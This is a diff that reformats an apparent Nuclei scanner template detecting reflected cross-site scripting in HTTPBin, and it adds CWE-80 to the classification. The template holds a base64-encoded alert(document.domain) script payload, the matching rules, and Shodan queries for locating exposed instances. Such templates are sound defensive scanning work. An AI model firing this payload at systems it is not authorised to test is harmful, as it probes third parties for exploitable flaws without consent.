@@ -1,5 +1,4 @@
 id: httpbin-xss
-
 info:
   name: HTTPBin - Cross-Site Scripting
   author: Adam Crosser
@@ -10,32 +9,27 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-80
   metadata:
     max-request: 1
     shodan-query:
       - html:"https://github.com/requests/httpbin"
       - title:"httpbin.org"
-  tags: xss,httpbin,oss,vuln
-
+  tags: httpbin,oss,vuln,xss
 http:
-  - method: GET
-    path:
-      - '{{BaseURL}}/base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+'
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        part: body
+  - matchers:
+      - part: body
         regex:
-          - '^<script>alert\(document.domain\)</script>$'
-
-      - type: word
-        part: header
+          - ^<script>alert\(document.domain\)</script>$
+        type: regex
+      - part: header
+        type: word
         words:
           - text/html
-
-      - type: status
-        status:
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+'
